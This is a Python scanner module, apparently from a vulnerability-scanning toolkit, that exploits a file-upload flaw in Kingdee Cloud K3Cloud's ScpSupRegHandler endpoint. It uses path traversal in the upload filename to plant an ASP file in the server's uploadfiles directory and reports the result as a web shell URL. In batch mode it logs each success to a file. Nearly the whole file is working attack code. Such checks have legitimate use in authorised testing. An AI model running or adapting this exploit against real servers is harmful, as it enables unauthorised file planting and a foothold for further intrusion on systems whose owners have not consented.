import json
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class JindieYunUpFileScan:
    def main(self,target):
        self.batch = target["batch_work"]
        base_url = target['url'].strip("/ ")
        header = target["header"]
        proxy = target["proxy"]
        ssl = target["ssl"]
        url = f"{base_url}/k3cloud/SRM/ScpSupRegHandler"
        self_headers, proxys = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JinDieYun", "开始检测漏洞...")
        headers = {
            "User-Agent": header,
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Connection": "close",
            "Cache-Control": "max-age=0",
        }

        files = {
            "FAtt": ("../../../../uploadfiles/76323527.asp", "<% Response.Write(\"738290225\") %>"),
        }

        data = {
            "FID": "2022",
            "dbId_v": ".",
        }
        try:
            response = requests.post(url, headers=headers, files=files, data=data,verify=ssl,proxies=proxys)

            res_json = json.loads(response.text)
            if res_json['IsSuccess']:
                if not self.batch:
                    OutPrintInfoSuc("JinDieYun",f"文件上传成功")
                    OutPrintInfo("JinDieYun",f"[b bright_red]Shell {url}/K3Cloud/uploadfiles/76323527.asp")
                else:
                    OutPrintInfoSuc("JinDieYun", f"文件上传成功Shell {url}/K3Cloud/uploadfiles/76323527.asp")
                    with open("./result/jindieyun_up_file.txt","a") as w:
                        w.write(f"文件上传成功Shell {url}/K3Cloud/uploadfiles/76323527.asp")

            else:
                if not self.batch:
                    OutPrintInfo("JinDieYun", "目标不存在漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("JinDieYun", "目标不存在漏洞")
        if not self.batch:
            OutPrintInfo("JinDieYun", "目标漏洞检测结束")
